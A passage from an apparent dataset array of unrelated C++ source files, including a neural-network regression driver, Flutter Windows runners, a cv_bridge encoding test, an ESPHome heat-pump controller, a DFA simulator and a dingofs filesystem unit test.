1; // Exit with an error code\n    }\n\n    //extract labels and get Index of all numerical columns\n    // cout << \"Preview of the CSV data:\\n\" << endl;\n    labels = DataPreprocessor::processAndClean(data); //cleans the csv (removes BOM and whitespace)\n    numerics = DataPreprocessor::getNumericIndex(data[1], nonNumerics); //also gets non-numerical cols\n\n\n    // cout << \"\\nNumerical column Indexes\" << endl;\n    // for(int i = 0; i < (int)numerics.size(); i++) {\n    //   cout << numerics[i] << \" \";\n    // }\n    // cout << endl;\n\n    // cout << \"\\nnonNumerical column Indexes\" << endl;\n    // for(int i = 0; i < (int)nonNumerics.size(); i++) {\n    //   cout << nonNumerics[i] << \" \";\n    // }\n    // cout << endl;\n\n    DataPreprocessor::standardize(data, numerics); //standardize numerical data\n\n    // DataPreprocessor::printHead(data, labels, 10, 12); //print head\n\n    DataPreprocessor::oneHotEncode(data, nonNumerics, labels); //encode non-numericals\n\n    convertedData = DataPreprocessor::convertData<double>(data, \"double\"); //convert all columns to doubles\n\n    DataPreprocessor::shuffleData(data); //shuffle to break order bias and improve generalization\n\n    // DataPreprocessor::printHead(data, labels, 5, 12);\n\n    DataPreprocessor::splitData(convertedData, 0.8, trainSet, testSet); //split 80/20 training test\n\n    cout << \"\\n Training set:\\n\";\n    DataPreprocessor::printHead<double>(trainSet, labels, 5, 12);\n\n    // cout << \"\\n Test set:\\n\";\n    // DataPreprocessor::printHead<double>(testSet, labels, 5, 12);\n\n    // cout << endl;\n\n    // cout << \"Make sure Data looks good before moving on. Hit enter to continue\\n\";\n    // cin.get();\n\n    int numFeatures = trainSet[0].size() - 1;\n\n\n        target = \"charges\";\n\n        bool found = false;\n        for (size_t i = 0; i < labels.size(); ++i) {\n            if (target == labels[i]) { // Using == for comparison\n                targetIndex = i;\n                found = true;\n                break;\n            }\n        }\n\n        if (!found) {\n            cout << \"Invalid column, try again\" << endl;\n            return 0;\n        }\n\n    // Prepare training data\n    vector<vector<double> > trainInputs;\n    vector<vector<double> > trainTargets;\n    tie(trainInputs, trainTargets) = DataPreprocessor::prepareInputsAndTargets(trainSet, targetIndex);\n\n    // Prepare testing data\n    vector<vector<double> > testInputs;\n    vector<vector<double> > testTargets;\n    tie(testInputs, testTargets) = DataPreprocessor::prepareInputsAndTargets(testSet, targetIndex);\n\n    // Display separated data\n    // cout << \"\\nSeparated Training Inputs and Targets.\" << endl;\n    // cout << \"Training Inputs Size: \" << trainInputs.size() << \" x \" << trainInputs[0].size() << endl;\n    // cout << \"Training Targets Size: \" << trainTargets.size() << \" x \" << trainTargets[0].size() << endl;\n\n    // cout << \"Test Inputs Size: \" << testInputs.size() << \" x \" << testInputs[0].size() << endl;\n    // cout << \"Test Targets Size: \" << testTargets.size() << \" x \" << testTargets[0].size() << endl << endl;\n\n    // Pause before proceeding\n    // cout << \"Ready to instantiate and train the Neural Network. Hit enter to continue.\";\n    // cin.get();\n\n    // Define network architecture\n    int inputSize = numFeatures;      // Number of input features\n    int hiddenSize = 6;              // Number of neurons in hidden layer (adjust as needed)\n    int outputSize = 1;               // Single output neuron for binary classification\n    double learningRate = 0.01;       // Learning rate (adjust as needed)\n    double decayRate = 0.005; //try 0.001 and 0.002\n\n    // choose activation functions\n    unique_ptr<ActivationFunction> hiddenActivation = make_unique<ReLU>();\n    unique_ptr<ActivationFunction> outputActivation = make_unique<Linear>();\n\n    // construct the neural network\n    ForwardNeuralNetwork nn(inputSize,\n                             hiddenSize,\n                             outputSize,\n                             learningRate,\n                             std::move(hiddenActivation),\n              ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"wmyspeed\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"object.h\"\n\n////public\n\nObject::Object() {\n\tsf::Color color(rand() % 256, rand() % 256, rand() % 256, 255);\n\timage.setFillColor(color);\n\timage.setRadius(rand() % 40 + 20);\n\n\timage.setPosition(sf::Vector2f(100, 100));\n\tvelocity.x = 0;\n\tvelocity.y = 0;\n\n\tacceleration.x = 0;\n\tacceleration.y = 0;\n\n\tmass = image.getRadius() * 0.9f;\n\tdamping = 0.8f;\n}\n\nObject::Object(sf::Vector2f pos) {\n\tsf::Color color(rand() % 256, rand() % 256, rand() % 256, 255);\n\timage.setFillColor(color);\n\timage.setRadius(rand() % 40 + 20);\n\n\timage.setPosition(pos);\n\tvelocity.x = 0;\n\tvelocity.y = 0;\n\n\tacceleration.x = 0;\n\tacceleration.y = 0;\n\n\tmass = image.getRadius() * 0.9f;\n\tdamping = 0.7f;\n}\n\nfloat Object::getDamping() {\n\treturn damping;\n}\n\nfloat Object::getMass() {\n\treturn mass;\n}\n\nsf::CircleShape& Object::getSprite() {\n\treturn image;\n}\n\nsf::Vector2f Object::getCenter() {\n\treturn sf::Vector2f(image.getPosition().x + image.getRadius(), image.getPosition().y + image.getRadius());\n}\n\nsf::Vector2f Object::getVelocity() {\n\treturn velocity;\n}\n\nvoid Object::setVelocity(sf::Vector2f vel) {\n\tvelocity = vel;\n}\n",
    "/*********************************************************************\n* Software License Agreement (BSD License)\n*\n*  Copyright (c) 2009, Willow Garage, Inc.\n*  All rights reserved.\n*\n*  Redistribution and use in source and binary forms, with or without\n*  modification, are permitted provided that the following conditions\n*  are met:\n*\n*   * Redistributions of source code must retain the above copyright\n*     notice, this list of conditions and the following disclaimer.\n*   * Redistributions in binary form must reproduce the above\n*     copyright notice, this list of conditions and the following\n*     disclaimer in the documentation and/or other materials provided\n*     with the distribution.\n*   * Neither the name of the Willow Garage nor the names of its\n*     contributors may be used to endorse or promote products derived\n*     from this software without specific prior written permission.\n*\n*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n*  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n*  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n*  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n*  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n*  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n*  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n*  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n*  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n*  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n*  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n*  POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************/\n\n#include <string>\n#include <vector>\n#include <gtest/gtest.h>\n\n#include \"opencv2/core/core.hpp\"  \n\n#include \"cv_bridge/cv_bridge.h\"\n#include <sensor_msgs/Image.h>\n#include <sensor_msgs/image_encodings.h>\n\nusing namespace sensor_msgs::image_encodings;\n\nbool isUnsigned(const std::string & encoding) {\n  return encoding == RGB8 || encoding == RGBA8 || encoding == RGB16 || encoding == RGBA16 || encoding == BGR8 || encoding == BGRA8 || encoding == BGR16 || encoding == BGRA16 || encoding == MONO8 || encoding == MONO16 ||\n                           encoding == MONO8 || encoding == MONO16 || encoding == TYPE_8UC1 || encoding == TYPE_8UC2 || encoding == TYPE_8UC3 || encoding == TYPE_8UC4 ||\n                           encoding == TYPE_16UC1 || encoding == TYPE_16UC2 || encoding == TYPE_16UC3 || encoding == TYPE_16UC4;\n                           //BAYER_RGGB8, BAYER_BGGR8, BAYER_GBRG8, BAYER_GRBG8, BAYER_RGGB16, BAYER_BGGR16, BAYER_GBRG16, BAYER_GRBG16,\n                           //YUV422\n}\nstd::vector<std::string>\ngetEncodings() {\n// TODO for Groovy, the following types should be uncommented\nstd::string encodings[] = { RGB8, RGBA8, RGB16, RGBA16, BGR8, BGRA8, BGR16, BGRA16, MONO8, MONO16,\n                           TYPE_8UC1, /*TYPE_8UC2,*/ TYPE_8UC3, TYPE_8UC4,\n                           TYPE_8SC1, /*TYPE_8SC2,*/ TYPE_8SC3, TYPE_8SC4,\n                           TYPE_16UC1, /*TYPE_16UC2,*/ TYPE_16UC3, TYPE_16UC4,\n                           TYPE_16SC1, /*TYPE_16SC2,*/ TYPE_16SC3, TYPE_16SC4,\n                           TYPE_32SC1, /*TYPE_32SC2,*/ TYPE_32SC3, TYPE_32SC4,\n                           TYPE_32FC1, /*TYPE_32FC2,*/ TYPE_32FC3, TYPE_32FC4,\n                           TYPE_64FC1, /*TYPE_64FC2,*/ TYPE_64FC3, TYPE_64FC4,\n                           //BAYER_RGGB8, BAYER_BGGR8, BAYER_GBRG8, BAYER_GRBG8, BAYER_RGGB16, BAYER_BGGR16, BAYER_GBRG16, BAYER_GRBG16,\n                           YUV422\n                         };\nreturn std::vector<std::string>(encodings, encodings+47-8-7);\n}\n\nTEST(OpencvTests, testCase_encode_decode)\n{\n  std::vector<std::string> encodings = getEncodings();\n  for(size_t i=0; i<encodings.size(); ++i) {\n    std::string src_encoding = encodings[i];\n    bool is_src_color_format = isColor(src_encoding) || isMono(src_encoding) || (src_encoding == sensor_msgs::image_encodings::YUV422);\n    cv::Mat image_original(cv::Size(400, 400), cv_bridge::getCvType(src_encoding));\n    cv::RNG r(77);\n    r.fill(image_original, cv::RNG::UNIFORM, 0, 127);\n\n    sensor_msgs::Image image_message;\n    cv_bridge::CvImage image_bridge(std_msgs::Header(), src_encoding, image_original);\n\n    // Convert to a sensor_msgs::Image\n    sensor_msgs::ImagePtr image_msg = image_bridge.toImageMsg();\n\n    for(size_t j=0; j<encodings.size(); ++j) {\n      std::string dst_encoding = encodings[j];\n      bool is_dst_color_format = isColor(dst_encoding) || isMono(dst_encoding) || (dst_encoding == sensor_msgs::image_encodings::YUV422);\n      bool is_num_channels_the_same = (numChannels(src_encoding) == numChannels(dst_encoding));\n\n      cv_bridge::CvImageConstPtr cv_image;\n      cv::Mat image_back;\n      // If the first type does not contain any color information\n      if (!is_src_color_format) {\n        // C",
    "#include \"wbk.h\"\n\nnamespace fs = std::filesystem;\n\nvoid test_run()\n{\n#if _DEBUG\n    WBK wbk2;\n    wbk2.read(R\"(TREYARCH_LOGO_EN.WBK)\");\n    WAV::writeWAV(R\"(TREYARCH_LOGO_EN.WBK.wav)\", wbk2.tracks[0], wbk2.entries[0].samples_per_second / WBK::GetNumChannels(wbk2.entries[0]), WBK::GetNumChannels(wbk2.entries[0]));\n\n    WAV replacement_wav;\n    replacement_wav.readWAV(R\"(TREYARCH_LOGO_EN.WBK.wav)\");\n    wbk2.replace(0, replacement_wav);\n    wbk2.write(R\"(TREYARCH_LOGO_EN.WBK_test.WBK)\");\n\n    WBK wbk3;\n    wbk3.read(R\"(TREYARCH_LOGO_EN.WBK_test.WBK)\");\n    WAV::writeWAV(R\"(TREYARCH_LOGO_EN.WBK_test.wav)\", wbk3.tracks[0], wbk3.entries[0].samples_per_second, WBK::GetNumChannels(wbk3.entries[0]));\n#endif\n}\n\nint main(int argc, char** argv)\n{\n    test_run();\n\n    if (argc < 4 || argc > 6) {\n        printf(\"Usage: %s -e|-r <.wbk> <.wav>\\n\", argv[0]);\n        return -1;\n    }\n    \n    bool extract = false;\n    int replace_idx = -1;\n    if (strstr(argv[1], \"-e\")) {\n        extract = true;\n    } else if (strstr(argv[1], \"-r\")) {\n        auto idx = atoi(argv[3]);\n        if (idx > INT_MIN && idx < INT_MAX)\n            replace_idx = idx;\n        else \n            printf(\"Invalid replacement index specified!\\n\");\n    } \n    else\n        return -1;\n\n    WBK wbk;\n    wbk.read(argv[2]);\n    if (extract)\n    {\n        size_t index = 0;\n        for (auto& track : wbk.tracks) {\n            WBK::nslWave& entry = wbk.entries[index];\n            fs::path output_path = std::string(argv[3]).append(std::to_string(index)).append(\".wav\");\n            WAV::writeWAV(output_path.string(), track, entry.samples_per_second / WBK::GetNumChannels(entry), WBK::GetNumChannels(entry));\n            ++index;\n        }\n        return 1;\n    }\n    else {\n        if (replace_idx > wbk.header.num_entries)\n            printf(\"Invalid replacement index specified!\\n\");\n        else\n        {\n            WAV replacement_wav;\n            if (replacement_wav.readWAV(argv[4])) {\n                if (wbk.replace(replace_idx, replacement_wav))\n                {\n                    fs::path path = fs::path(std::string(argv[2])).replace_extension(\".new.wbk\").string();\n                    wbk.write(path);\n                    printf(\"Replaced index %d and written to %s\\n\", replace_idx, path.string().c_str());\n                }\n            }\n        }\n    }\n    return 1;\n}",
    "//Longest Subarray with Sum K\n\nint longestSubarray(vector<int>& arr, int k) {\n    unordered_map<int, int> prefixSumIndex; // To store the first occurrence of each prefix sum\n    int sum = 0;                            // Current prefix sum\n    int maxLength = 0;                      // Length of the longest subarray with sum = k\n\n    for (int i = 0; i < arr.size(); i++) {\n        sum += arr[i]; // Update the prefix sum\n\n        // Case 1: If the prefix sum is equal to k, update maxLength\n        if (sum == k) {\n            maxLength = max(maxLength, i + 1);\n        }\n\n        // Case 2: If (sum - k) exists in the map, we found a subarray with sum = k\n        if (prefixSumIndex.find(sum - k) != prefixSumIndex.end()) {\n            maxLength = max(maxLength, i - prefixSumIndex[sum - k]);\n        }\n\n        // Case 3: Store the first occurrence of the current prefix sum\n        if (prefixSumIndex.find(sum) == prefixSumIndex.end()) {\n            prefixSumIndex[sum] = i;\n        }\n    }\n\n    return maxLength;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rent_it_mobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ecodan.h\"\r\n\r\n#include \"esphome.h\"\r\n\r\n#include <functional>\r\n#include <queue>\r\n\r\nnamespace esphome {\r\nnamespace ecodan \r\n{       \r\n    void EcodanHeatpump::set_room_thermostat_target_temp(float temp, ClimateRoomIdentifier room) {\r\n        if (temp != NAN) {\r\n            auto room_index = static_cast<uint8_t>(room);\r\n            status.TargetRoomTemperatures[room_index] = temp;\r\n\r\n            Message cmd{MsgType::THERMOSTAT_SET, SetType::THERMOSTAT_TEMPERATURE_SETTINGS};\r\n            for (auto i = 0; i < MAX_REMOTE_THERMOSTATS; i++) {\r\n                if (CHECK_BIT(static_cast<uint8_t>(status.RcMask), i)){\r\n                    auto roundedTemp = round_nearest_half(status.TargetRoomTemperatures[i]);\r\n                    cmd.set_float8_v3(roundedTemp, 1+i);\r\n                }\r\n                else {\r\n                    cmd[1+i] = 0xff;\r\n                }\r\n            }\r\n            schedule_cmd(cmd);\r\n        }\r\n    }\r\n\r\n    bool EcodanHeatpump::schedule_cmd(Message& cmd)\r\n    {   \r\n        cmdQueue.emplace(std::move(cmd));\r\n        return dispatch_next_cmd();\r\n    }\r\n\r\n    void EcodanHeatpump::update_room_mask(uint8_t room_identifier) {\r\n        auto room = static_cast<ClimateRoomIdentifier>(room_identifier);\r\n        switch(room) {\r\n            case ClimateRoomIdentifier::ROOM_0:\r\n                status.RcMask |= Status::RCMASK::RC0;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_1:\r\n                status.RcMask |= Status::RCMASK::RC1;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_2:\r\n                status.RcMask |= Status::RCMASK::RC2;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_3:\r\n                status.RcMask |= Status::RCMASK::RC3;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_4:\r\n                status.RcMask |= Status::RCMASK::RC4;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_5:\r\n                status.RcMask |= Status::RCMASK::RC5;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_6:\r\n                status.RcMask |= Status::RCMASK::RC6;\r\n            break;\r\n            case ClimateRoomIdentifier::ROOM_7:\r\n                status.RcMask |= Status::RCMASK::RC7;\r\n            break;\r\n        }\r\n    }\r\n\r\n    #define MAX_STATUS_CMD_SIZE 2\r\n    Message statusCmdQueue[MAX_STATUS_CMD_SIZE] = {\r\n        // initial request\r\n        Message{MsgType::THERMOSTAT_INITIAL_GET, GetType::THERMOSTAT_STATE_A},\r\n        //Message{MsgType::THERMOSTAT_INITIAL_GET, std::array<char, PAYLOAD_SIZE> { static_cast<char>(GetType::THERMOSTAT_STATE_A), 0x03, 0xff, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 } },\r\n        Message{MsgType::THERMOSTAT_GET, GetType::THERMOSTAT_STATE_B} \r\n    };\r\n\r\n    bool EcodanHeatpump::dispatch_next_status_cmd()\r\n    {\r\n        if (proxy_available())\r\n            return true;\r\n        \r\n        auto static cmdIndex = 0;\r\n        Message& cmd = statusCmdQueue[cmdIndex];\r\n        cmdIndex = (cmdIndex + 1) % MAX_STATUS_CMD_SIZE;\r\n\r\n        if (cmd.type() == MsgType::THERMOSTAT_INITIAL_GET) {\r\n            cmd[1] = static_cast<uint8_t>(status.RcMask);\r\n            cmd[2] = 0xff;\r\n        } else if (cmd.type() == MsgType::THERMOSTAT_GET) {\r\n            // fill all current thermostat values\r\n            for (auto i = 0; i < MAX_REMOTE_THERMOSTATS; i++) {\r\n                if (CHECK_BIT(static_cast<uint8_t>(status.RcMask), i)){\r\n                    if (status.CurrentRoomTemperatures[i] != 0xff) {\r\n                        auto roundedTemp = round_nearest_half(status.CurrentRoomTemperatures[i]);\r\n                        cmd.set_float8_v3(roundedTemp, 1+i);\r\n                    }\r\n                    else {\r\n                        // default 20c if sensor did not have a valid value to prevent P1 errors\r\n                        cmd.set_float8_v3(20.0f, 1+i);\r\n                    }\r\n                }\r\n                else {\r\n                    cmd[1+i] = 0xff;\r\n                }\r\n            }\r\n            cmd[9] = static_cast<uint8_t>(status.RcMask);\r\n            cmd[10] = 0xff;\r\n        }\r\n\r\n        if (!serial_tx(uart_, cmd))\r\n        {\r\n            ESP_LOGI(TAG, \"Unable to dispatch status update request, flushing queued requests...\");\r\n            cmdIndex = 0;\r\n            connected = false;\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    bool EcodanHeatpump::dispatch_next_cmd()\r\n    {\r\n        if (cmdQueue.empty())\r\n        {\r\n            return true;\r\n        }\r\n        \r\n        //ESP_LOGI(TAG, msg.debug_dump_packet().c_str());\r\n\r\n        if (!serial_tx(uart_, cmdQueue.front()))\r\n        {\r\n            ESP_LOGI(TAG, \"Unable to dispatch status update request, flushing queued requests...\");\r\n            connected = false;\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    bool EcodanHeatpump::begin_connect()\r\n    {\r\n        Message cmd{MsgType::CONNECT_CMD};\r\n        uint8_t payload[2] = {0xCA, 0x01 };\r\n        cmd.write_payload(pa",
    "#include \"Instance.h\"\n\n#include <cstdio>\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <stdexcept>\n#include <string>\n\nInstance::Instance(const std::filesystem::path &path) {\n\n    std::ifstream file(path);\n\n    if (!file) {\n        throw std::runtime_error(\"Could not read file\");\n    }\n\n    // Read number of jobs\n    std::string current_line;\n    getline(file, current_line);\n    m_num_jobs = std::stoull(current_line);\n\n    // Read number of machines\n    getline(file, current_line);\n    m_num_machines = std::stoull(current_line);\n\n    // Read the main matrix\n    m_matrix.reserve(m_num_jobs);\n    while (getline(file, current_line)) {\n        std::istringstream iss(current_line);\n\n        size_t number = std::numeric_limits<size_t>::max();\n\n        std::vector<long> temporary;\n        temporary.reserve(m_num_machines);\n\n        while (iss >> number) {\n            temporary.emplace_back(number);\n        }\n\n        if (temporary.size() != m_num_machines) {\n            throw std::runtime_error(\"Wrong number of machines on instance\");\n        }\n        m_matrix.emplace_back(std::move(temporary));\n    }\n\n    if (m_matrix.size() != m_num_jobs || !file.eof()) {\n        throw std::runtime_error(\"Wrong number of jobs on instance\");\n    }\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <unordered_map>\r\n#include <vector>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\n\r\ntypedef unordered_map<char, int> Transition;\r\ntypedef unordered_map<int, Transition> TransitionTable;\r\n\r\nint main() {\r\n \r\n    int numStates;\r\n    int initialState;\r\n    vector<int> acceptingStates;\r\n    int numSymbols;\r\n    cout<<\"Enter Number of Symbols\";\r\n    cin>>numSymbols;\r\n\r\n   \r\n    cout << \"Enter the number of states: \";\r\n    cin >> numStates;\r\n    cout << \"Enter the initial state: \";\r\n    cin >> initialState;\r\n\r\n    \r\n    int numAcceptingStates;\r\n    cout << \"Enter the number of accepting states: \";\r\n    cin >> numAcceptingStates;\r\n    cout << \"Enter the accepting states: \";\r\n    for (int i = 0; i < numAcceptingStates; ++i) {\r\n        int state;\r\n        cin >> state;\r\n        acceptingStates.push_back(state);\r\n    }\r\n     \r\n   \r\n    TransitionTable transitionTable;\r\n    int numTransitions=numStates*numSymbols;\r\n    cout << \"Enter transitions in the format <current_state> <input_symbol> <next_state>:\\n\";\r\n    for (int i = 0; i < numTransitions; ++i) {\r\n        int currentState, nextState;\r\n        char symbol;\r\n        cin >> currentState >> symbol >> nextState;\r\n        transitionTable[currentState][symbol] = nextState;\r\n    }\r\n\r\n  \r\n    string input;\r\n    cout << \"Enter the input string: \";\r\n    cin >> input;\r\n\r\n    int currentState = initialState;\r\n\r\n    for (char symbol : input) {\r\n        if (transitionTable[currentState].count(symbol) == 0) {\r\n            cout << \"Rejected: Invalid input symbol \\\"\" << symbol << \"\\\".\" << endl;\r\n            return 0;\r\n        }\r\n        currentState = transitionTable[currentState][symbol];\r\n\r\n    }\r\n\r\n   \r\n   if (find(acceptingStates.begin(), acceptingStates.end(), currentState) != acceptingStates.end())  \r\n {\r\n        cout << \"Accepted\" << endl;\r\n    } else {\r\n        cout << \"Rejected\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include<bits/stdc++.h>\r\n#define int long long\r\n#define pii pair<int, int>\r\n#define f0 first\r\n#define s0 second\r\n#define pb push_back\r\nusing namespace std;\r\n\r\nint constexpr maxn = 2e5 + 5;\r\n\r\nstruct fenwick_tree{\r\n     int n;\r\n\r\n\tvector<int> bit;\r\n\r\n\tvoid build(int n){\r\n\t    this->n = n;\r\n\t    bit.assign(n + 1, 0);\r\n\t    return;\r\n\t}\r\n\r\n\tvoid update(int ind, int val){\r\n\t\tfor(int i = ind; i < bit.size(); i += i & (-i))\r\n\t\t\tbit[i] += val;\r\n\t\treturn;\r\n\t}\r\n\r\n\tint query(int ind){\r\n\t\tint sum = 0;\r\n\t\tfor(int i = ind; 0 < i; i -= i & (-i))\r\n\t\t\tsum += bit[i];\r\n\t\treturn sum;\r\n\t}\r\n\r\n\tint common_query(int l, int r){\r\n        return query(r) - query(l - 1);\r\n    }\r\n};\r\n\r\nvoid preprocess(){\r\n\treturn;\r\n}\r\n\r\nvoid give_input(){\r\n\treturn;\r\n}\r\n\r\nvoid process(){\r\n\treturn;\r\n}\r\n\r\nvoid get_output(){\r\n\treturn;\r\n}\r\n\r\nsigned main(){\r\n    ios::sync_with_stdio(0), cin.tie(0);\r\n\tint t = 1;\r\n\tcin >> t;\r\n\tpreprocess();\r\n    while(t--){\r\n        give_input();\r\n        process();\r\n        get_output();\r\n    }\r\n    return 0;\r\n}\r\n",
    "/*\n *  Copyright (c) 2020 NetEase Inc.\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\n/*\n * Project: dingo\n * Created Date: Tuesday December 18th 2018\n * Author: yangyaokai\n */\n\n#include <dirent.h>\n#include <gmock/gmock.h>\n#include <gtest/gtest.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/vfs.h>\n\n#include <memory>\n\n#include \"fs/ext4_filesystem_impl.h\"\n#include \"fs/mock_posix_wrapper.h\"\n\nusing ::testing::_;\nusing ::testing::DoAll;\nusing ::testing::ElementsAre;\nusing ::testing::Ge;\nusing ::testing::Gt;\nusing ::testing::Mock;\nusing ::testing::NotNull;\nusing ::testing::Return;\nusing ::testing::ReturnArg;\nusing ::testing::ReturnPointee;\nusing ::testing::SetArgPointee;\nusing ::testing::StrEq;\n\nnamespace dingofs {\nnamespace fs {\n\nACTION_TEMPLATE(SetVoidArgPointee, HAS_1_TEMPLATE_PARAMS(int, k),\n                AND_1_VALUE_PARAMS(first)) {\n  auto output = reinterpret_cast<char*>(::testing::get<k>(args));\n  *output = first;\n}\n\nclass Ext4LocalFileSystemTest : public testing::Test {\n public:\n  void SetUp() {\n    wrapper = std::make_shared<MockPosixWrapper>();\n    lfs = Ext4FileSystemImpl::getInstance();\n    lfs->SetPosixWrapper(wrapper);\n    errno = 1234;\n  }\n\n  void TearDown() {\n    errno = 0;\n    // allows the destructor of lfs_ to be invoked correctly\n    Mock::VerifyAndClear(wrapper.get());\n  }\n\n protected:\n  std::shared_ptr<MockPosixWrapper> wrapper;\n  std::shared_ptr<Ext4FileSystemImpl> lfs;\n};\n\nTEST_F(Ext4LocalFileSystemTest, InitTest) {\n  LocalFileSystemOption option;\n  option.enableRenameat2 = true;\n  struct utsname kernel_info;\n\n  // \u6d4b\u8bd5\u7248\u672c\u504f\u4f4e\u7684\u60c5\u51b5\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\", \"2.16.0\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(lfs->Init(option), -1);\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\",\n           \"3.14.0-sss\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(lfs->Init(option), -1);\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\",\n           \"3.14.19-sss\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(lfs->Init(option), -1);\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\",\n           \"3.15.0-sss\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(0, lfs->Init(option));\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\",\n           \"3.15.1-sss\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(0, lfs->Init(option));\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\",\n           \"3.16.0-sss\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), Return(0)));\n  ASSERT_EQ(0, lfs->Init(option));\n\n  snprintf(kernel_info.release, sizeof(kernel_info.release), \"%s\", \"4.16.0\");\n  EXPECT_CALL(*wrapper, uname(NotNull()))\n      .WillRepeatedly(DoAll(SetArgPointee<0>(kernel_info), 